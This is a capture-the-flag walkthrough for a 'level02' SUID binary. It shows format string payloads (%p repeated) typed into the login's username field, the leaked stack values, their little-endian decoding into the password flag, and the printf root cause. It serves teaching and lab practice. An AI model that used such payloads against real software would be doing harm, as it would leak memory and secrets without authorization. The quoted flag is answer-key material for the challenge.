# Level02 Walkthrough

## Initial Enumeration

After connecting to the machine and switching to `level02`, I started by enumerating files in the directory. I found a 64-bit ELF binary named `level02` with the SUID bit set:

```bash
$ ls -l
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
```

Since the binary was SUID, it was likely intended to run with elevated privileges, making it an interesting target.

## Testing the Binary

Executing the binary presented a login prompt:

```text
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username:
--[ Password:
```

The program appeared to require a username and password, with the password likely being the flag.

## Discovering the Format String Vulnerability

To test for common vulnerabilities, I supplied format string specifiers as the username:

```text
--[ Username: %p%p%p
--[ Password: pass
```

The program responded with:

```text
*****************************************
0x7fffffffe4f0(nil)0x70 does not have access!
```

Instead of printing the literal `%p` characters, the application interpreted them as format specifiers and printed memory addresses. This confirmed the presence of a **format string vulnerability** in the username field.

## Leaking Memory

To dump more memory, I increased the number of format specifiers:

```text
%p%p%p%p%p%p%p%p%p%p...
```

I repeated `%p` around 50 times and copied the resulting hexadecimal output.

Example:

```text
0x41414141 0x67616c66 0x7b...
```

The leaked data contained values from the process memory, including what appeared to be portions of the password/flag.

## Extracting the Flag

Among the leaked stack values, several addresses did not look like pointers. Instead, they appeared to contain printable ASCII data:

```text
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
```

Since the binary is running on an x86-64 system, the values are stored in little-endian format. Reversing the byte order of each 64-bit value reveals the original characters:

```text
0x756e505234376848 -> Hh74RPnu
0x45414a3561733951 -> Q9sa5JAE
0x377a7143574e6758 -> XgNWCqz7
0x354a35686e475873 -> sXGnh5J5
0x48336750664b394d -> M9KfPg3H
```

Combining the decoded strings gives:

```text
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

This value was the password stored on the stack and therefore the flag.

### Root Cause

The username field was passed directly to a formatted output function such as:

```c
printf(username);
```

instead of:

```c
printf("%s", username);
```

As a result, user-controlled format specifiers (`%p`) were interpreted by `printf`, allowing arbitrary stack values to be disclosed. By repeatedly printing stack contents and decoding the leaked data, the flag could be recovered without knowing the password beforehand.

## Conclusion

The vulnerability was a classic **format string vulnerability** in the username field. By supplying multiple `%p` specifiers, I was able to leak stack memory contents. Decoding the leaked hexadecimal values and accounting for little-endian byte ordering revealed the password stored in memory, which was also the flag.
